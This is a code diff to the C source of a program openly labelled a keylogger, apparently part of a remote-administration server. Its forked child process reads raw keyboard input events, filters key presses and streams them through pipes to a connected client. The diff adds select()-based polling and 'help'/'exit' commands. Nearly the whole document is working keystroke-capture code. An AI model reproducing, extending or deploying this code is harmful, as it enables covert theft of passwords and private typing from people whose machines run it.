@@ -11,17 +11,11 @@ size_t event_size = sizeof(t_event);
 
 #include <fcntl.h>
 #include <sys/ioctl.h>
-/* 
-static int set_nonblocking(int fd) {
-    int flags = 1;  // 1 = enable non-blocking, 0 = disable
-    
-    if (ioctl(fd, FIONBIO, &flags) < 0) {
-        perror("ioctl FIONBIO failed");
-        return -1;
-    }
-    return 0;
-}
- */
+
+#define KLG_HELP "Available commands:\n\
+help: print this help\n\
+exit: close keylogger\n"
+
 static int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)
 {
 	int written;
@@ -32,6 +26,16 @@ static int writeEventsIntoFile(int fd, struct input_event *events, size_t to_wri
 	if (written < 0)
 		return written;
 	return 1;
+}
+
+void handle_klg_cmd(char *bfr) {
+	//printf("recieved : %s\n", bfr);
+	if (!strncmp("help\n", bfr, strlen(bfr))) {
+		printf(KLG_HELP);
+	}
+	if (!strncmp("exit\n", bfr, strlen(bfr))) {
+		exit(0);
+	}
 }
 
 int	keylogger_function(t_server *server, int index)
@@ -47,8 +51,6 @@ int	keylogger_function(t_server *server, int index)
 	pipe(outpipe_fds);
 	server->clients[index].inpipe_fd = inpipe_fds[WRITE_END]; //write end for server, we read from 0 here in stdin
 	server->clients[index].outpipe_fd = outpipe_fds[READ_END]; //read end for server, we write in 1 here
-/* 	set_nonblocking(inpipe_fds[WRITE_END]);
-	set_nonblocking(outpipe_fds[READ_END]); */
 
 	pid = fork();
 	if (pid < 0) {
@@ -58,11 +60,13 @@ int	keylogger_function(t_server *server, int index)
 		//setsid();
 
 		close(server->fd);
-		dup2(inpipe_fds[READ_END], STDIN_FILENO);
-		dup2(outpipe_fds[1], STDERR_FILENO);
-		dup2(outpipe_fds[WRITE_END], STDOUT_FILENO);
-		close(outpipe_fds[READ_END]);
 		close(inpipe_fds[WRITE_END]);
+		close(outpipe_fds[READ_END]);
+		dup2(inpipe_fds[READ_END], STDIN_FILENO);
+		dup2(outpipe_fds[WRITE_END], STDERR_FILENO);
+		dup2(outpipe_fds[WRITE_END], STDOUT_FILENO);
+		close(inpipe_fds[READ_END]);
+		close(outpipe_fds[WRITE_END]);
 		close(client_fd);
 		int	kb;
 		if (!keyboardFound(DEV_PATH, &kb)) {
@@ -71,22 +75,41 @@ int	keylogger_function(t_server *server, int index)
 		}
 
 		t_event kbd_events[event_size * MAX_EVENTS];
+		fd_set rset;
+		
+		int maxfd = kb;
 
 		while (1)
 		{
-			int r = read(kb, kbd_events, event_size * MAX_EVENTS);
-			if (r < 0)
-				break ;
-			else
-			{
-				size_t j = 0;
-				for (size_t i = 0; i < r / event_size; i++) //for each event read
-				{
-					if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) //if a key has been pressed..
-						kbd_events[j++] = kbd_events[i];                                    //add the event to the beginning of the array
-				}
-				if (writeEventsIntoFile(STDOUT_FILENO, kbd_events, j * event_size) < 0)
+			fflush(stdout);
+			FD_SET(STDIN_FILENO, &rset);
+			FD_SET(kb, &rset);
+			struct timeval tv = {.tv_sec = 0, .tv_usec = 5000};
+			int retval = select(maxfd + 1, &rset, NULL, NULL, &tv);
+			if (retval == -1) { perror("select"); break; }
+			if (FD_ISSET(kb, &rset)) {
+				int r = read(kb, kbd_events, event_size * MAX_EVENTS);
+				if (r < 0)
 					break ;
+				else
+				{
+					size_t j = 0;
+					for (size_t i = 0; i < r / event_size; i++) //for each event read
+					{
+						if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) //if a key has been pressed..
+							kbd_events[j++] = kbd_events[i];                                    //add the event to the beginning of the array
+					}
+					if (writeEventsIntoFile(STDOUT_FILENO, kbd_events, j * event_size) < 0)
+						break ;
+				}
+			}
+			if (FD_ISSET(STDIN_FILENO, &rset)) {
+				char buffer[256];
+				int r = read(STDIN_FILENO, buffer, 255);
+				if (r <= 0)
+					break ;
+				buffer[r] = 0;
+				handle_klg_cmd(buffer);
 			}
 		}
 		close(STDOUT_FILENO);
